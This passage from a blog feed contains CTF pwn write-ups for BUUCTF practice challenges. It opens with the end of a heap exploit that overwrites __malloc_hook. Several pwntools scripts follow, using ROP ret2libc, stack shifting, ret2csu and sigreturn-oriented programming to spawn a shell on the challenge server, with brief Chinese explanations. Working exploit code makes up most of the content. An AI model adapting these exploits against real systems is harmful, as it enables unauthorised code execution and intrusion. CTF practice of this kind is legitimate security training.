0xf0897]</span></span><br><span class="line"><span class="comment"># one_gadgets = [0x3f4a6, 0x3f4fa, 0xd5b87]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_note</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_note</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drop_note</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_note</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">create_note(<span class="number">0x48</span>)   <span class="comment"># chunk_info #0</span></span><br><span class="line">create_note(<span class="number">0x48</span>)   <span class="comment"># chunk_info #1</span></span><br><span class="line">create_note(<span class="number">0x88</span>)   <span class="comment"># chunk_info #2</span></span><br><span class="line"></span><br><span class="line">create_note(<span class="number">0x18</span>)   <span class="comment"># chunk_info #3</span></span><br><span class="line">create_note(<span class="number">0x18</span>)   <span class="comment"># chunk_info #4</span></span><br><span class="line">create_note(<span class="number">0x68</span>)   <span class="comment"># chunk_info #5</span></span><br><span class="line"></span><br><span class="line">create_note(<span class="number">0x18</span>)   <span class="comment"># chunk_info #6</span></span><br><span class="line">write_note(<span class="number">0</span>, <span class="number">0x48</span>+<span class="number">10</span>, cyclic(<span class="number">0x48</span>) + <span class="string">b&#x27;\xE1&#x27;</span>)</span><br><span class="line">drop_note(<span class="number">1</span>)</span><br><span class="line">create_note(<span class="number">0x48</span>)   <span class="comment"># chunk_info #1</span></span><br><span class="line">show_note(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">8</span>)) - <span class="number">88</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena))</span><br><span class="line">__malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;__malloc_hook&quot;</span>, __malloc_hook)</span><br><span class="line">base = __malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">__free_hook = base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">realloc = base + libc.dump(<span class="string">&#x27;realloc&#x27;</span>)</span><br><span class="line">create_note(<span class="number">0x88</span>)   <span class="comment"># chunk_info #7, same addr as #2</span></span><br><span class="line">write_note(<span class="number">3</span>, <span class="number">0x18</span>+<span class="number">10</span>, cyclic(<span class="number">0x18</span>) + <span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line">drop_note(<span class="number">4</span>)</span><br><span class="line">create_note(<span class="number">0x88</span>)   <span class="comment"># chunk_info #4, overlap #5</span></span><br><span class="line">write_note(<span class="number">4</span>, <span class="number">0x88</span>, (<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0x20</span>) + p64(<span class="number">0x71</span>)).ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">drop_note(<span class="number">5</span>)</span><br><span class="line">write_note(<span class="number">4</span>, <span class="number">0x88</span>, (<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0x20</span>) + p64(<span class="number">0x71</span>) + p64(__malloc_hook - <span class="number">0x23</span>)).ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">create_note(<span class="number">0x68</span>)   <span class="comment"># chunk_info #5</span></span><br><span class="line">create_note(<span class="number">0x68</span>)   <span class="comment"># chunk_info #8, to __malloc_hook</span></span><br><span class="line">write_note(<span class="number">8</span>, <span class="number">0x13</span> + <span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xB</span> + p64(base + one_gadgets[<span class="number">3</span>]) + p64(realloc + <span class="number">4</span>))</span><br><span class="line">create_note(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwn write-ups (3)</title>
      <link href="/2023/02/28/buuctf-pwn-write-ups-3/"/>
      <url>/2023/02/28/buuctf-pwn-write-ups-3/</url>
      
        <content type="html"><![CDATA[<h1 id="buu027-HarekazeCTF2019-baby-rop2"><a href="#buu027-HarekazeCTF2019-baby-rop2" class="headerlink" title="buu027-[HarekazeCTF2019]baby_rop2"></a>buu027-[HarekazeCTF2019]baby_rop2</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29802</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400733</span></span><br><span class="line">poprsir15_ret = <span class="number">0x400731</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(<span class="number">0x400790</span>)</span><br><span class="line">payload += p64(poprsir15_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s your name? &#x27;</span>, payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">read = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">base = read - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">payload += p64(elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s your name? &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu028-ciscn-2019-es-2"><a href="#buu028-ciscn-2019-es-2" class="headerlink" title="buu028-ciscn_2019_es_2"></a>buu028-ciscn_2019_es_2</h1><p>这一题乍一看是栈溢出，但最鸡贼的是只能溢出4个字节，也就是只够覆盖返回地址。不过还是有办法拿到libc的地址的：</p><p><img src="https://img-blog.csdnimg.cn/ce7a88efd4434a0c99b9f83f73ff0205.png"><br>这是还没有进入vul函数时的栈环境，可以看到下面的f7de3ed5是libc之中的地址（_dl_fini是ld.so中的地址，而不是libc的）。我们溢出之后程序会打印出后面一部分地址的值，但是遇到空字节会截断。于是我们可以反复返回到vul函数的开头，你会发现每一次返回后，存返回地址的地址都会向后移4个字节。于是我们通过这种方法返回4次vul函数就能够成功越过上图ebp的0字节，通过printf获取libc地址。</p><p>有了libc之后，我们需要考虑如何执行system函数。要知道，我们只能溢出4个字节。别慌，我们有main函数。在进入vul函数时，memset只会将前20个字符清零，而对后面的不作处理，这就给了我们一丝机会。我们想把”\bin\sh”的地址写到返回地址的后面，肯定不能直接溢出，因为长度不够。所以我们干脆就返回到main函数中，要知道main函数也是占用一定的栈空间的，这样做可以让下一次执行vul函数时的栈向下压。这样原先写到栈上的”\bin\sh”地址就到了函数返回地址的后面去了。</p><p><img src="https://img-blog.csdnimg.cn/41d684be9aa04ef2873caabce063d9e9.png"><br>这个过程建议通过gdb调试一下加深理解。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25990</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># repeat 3 times of function vul to reach address of __libc_start_main + 241</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Welcome, my friend. What\&#x27;s your name?\n&#x27;</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Hello&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Hello&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Hello&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fourth time, we can get the address of libc</span></span><br><span class="line">io.send(cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">rc = io.recv()</span><br><span class="line"><span class="built_in">print</span>(rc)</span><br><span class="line">libc_start_main = u32(rc[-<span class="number">5</span>:-<span class="number">1</span>]) - <span class="number">241</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main)</span><br><span class="line"></span><br><span class="line">base = libc_start_main - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system: &#x27;</span> + <span class="built_in">hex</span>(sys))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh: &#x27;</span> + <span class="built_in">hex</span>(binsh))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(cyclic(<span class="number">0x20</span>) + p32(binsh) * <span class="number">3</span> +  p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>]))</span><br><span class="line"><span class="comment"># return to vul to adjust stack environment</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Welcome, my friend. What\&#x27;s your name?\n&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(sys))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Hello&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(cyclic(<span class="number">0x2c</span>) + p32(sys))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Hello&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(sys))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu029-jarvisoj-tell-me-something"><a href="#buu029-jarvisoj-tell-me-something" class="headerlink" title="buu029-jarvisoj_tell_me_something"></a>buu029-jarvisoj_tell_me_something</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27850</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your message:\n&#x27;</span>, cyclic(<span class="number">0x88</span>) + p64(<span class="number">0x400620</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu030-ciscn-2019-s-3"><a href="#buu030-ciscn-2019-s-3" class="headerlink" title="buu030-ciscn_2019_s_3"></a>buu030-ciscn_2019_s_3</h1><p>这道题一看汇编，明摆着是考我们系统调用。其中有mov rax, 3bh，3b就是execve的系统调用号。之后需要在rdi中传入’&#x2F;bin&#x2F;sh’的地址，但是原程序中并没有这个字符串。</p><p>目前有一个主要的问题：如果要自己构造’&#x2F;bin&#x2F;sh’或者是查找libc，如何获取这个字符串的地址？通过ret2csu我们可以很容易地将任意值pop到rdi中，所以关键就在于如何获取字符串地址。如果这个字符串自己构造，栈上的地址一般都不容易获取到。如果要查找libc，那么首先要获取libc基址。前面已经提到我们无法直接通过sys_write打印，但同时我们也不要忘记，返回地址不一定要是函数的开头。如果在读写函数返回后编写gadget，直接返回到写30字节的地方，那么我们就能够直接进行打印，此时write打印出的数据中有部分是我们没有修改的，且返回之后我们能够将rsp抬高8字节获取到更加靠前的栈区内容，也就有机会能够获取到libc的基址。</p><p><img src="https://img-blog.csdnimg.cn/47bedf4bdae240d0824554966960e1ea.png"><br>上图中libc的基址正好在打印地址之后0x30的位置，所以还需要再返回两次，与第28题的方法相同。这种方法笔者称之为碰瓷流，与这道题的出题人本意不符。</p><p>exp：（调用system(‘&#x2F;bin&#x2F;sh’)）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28675</span>)</span><br><span class="line"></span><br><span class="line">write = <span class="number">0x400503</span></span><br><span class="line">read_write = <span class="number">0x4004ed</span></span><br><span class="line">poprdi_ret = <span class="number">0x4005a3</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)</span><br><span class="line">payload += p64(write)<span class="comment"># We use write twice to make rsp go up to reach the &#x27;__libc_start_main&#x27;</span></span><br><span class="line">payload += p64(write)</span><br><span class="line">payload += p64(read_write)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_start_main = u64(io.recv()[-<span class="number">8</span>:]) - <span class="number">231</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main)</span><br><span class="line">base = libc_start_main - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(sys)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>本题实际上考察的是sigreturn的使用。说得简单点就是通过sigreturn（调用号0xF）的系统调用能够返回到用户状态，而这个用户状态的结构体就在sigreturn后的栈空间中，由此可以进行伪造。具体原理参见<a href="https://blog.csdn.net/zsj2102/article/details/78561112?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165259846916781818710887%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165259846916781818710887&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-78561112-null-null.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=sigreturn&spm=1018.2226.3001.4187">资料</a>。在pwnfiles中为我们提供了伪造sigreturn结构体的类SigreturnFrame方便我们构造。</p><p>exp：（调用sigreturn，binsh地址仍然采用碰瓷方式获取）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28675</span>)</span><br><span class="line"></span><br><span class="line">write = <span class="number">0x400503</span></span><br><span class="line">read_write = <span class="number">0x4004ed</span></span><br><span class="line">poprdi_ret = <span class="number">0x4005a3</span></span><br><span class="line">poprsir15_ret = <span class="number">0x4005a1</span></span><br><span class="line">movrax3b_ret = <span class="number">0x4004e2</span></span><br><span class="line">movrax0f_ret = <span class="number">0x4004da</span></span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)</span><br><span class="line">payload += p64(write)</span><br><span class="line">payload += p64(write)</span><br><span class="line">payload += p64(read_write)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_start_main = u64(io.recv()[-<span class="number">8</span>:]) - <span class="number">231</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main)</span><br><span class="line">base = libc_start_main - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys - libc_start_main))</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)</span><br><span class="line">payload += p64(movrax0f_ret)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = binsh</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload += flat(frame)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>同时我们发现，我们能够通过write打印出栈区某处的地址，与当前rsp的差值固定。因此还可以直接通过read读取’&#x2F;bin&#x2F;sh’字符串到栈上，再通过write获取栈区地址以获取我们构造的’&#x2F;bin&#x2F;sh’的地址。此种方法清参见<a href="https://blog.csdn.net/m0_52231248/article/details/121361488?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165259686716782350962406%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165259686716782350962406&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-121361488-null-null.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=ciscn_2019_s_3&spm=1018.2226.3001.4187">别人写的wp</a>。</p><p>由此，这道题获取’&#x2F;bin&#x2F;sh’地址有两种方法，getshell也有两种方法，组合一下就能写出4种不同的exp。在学习过程中，不能以做出来题为目标，而应深入思考内部的原理，以及有没有其他的方法。</p><h1 id="buu031-jarvisoj-level3"><a href="#buu031-jarvisoj-level3" class="headerlink" title="buu031-jarvisoj_level3"></a>buu031-jarvisoj_level3</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27404</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">140</span>)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;vulnerable_function&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">read = u32(io.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read)</span><br><span class="line">base = read - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">140</span>)</span><br><span class="line">payload += p32(sys)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息安全数学基础 Chapter 1——整除</title>
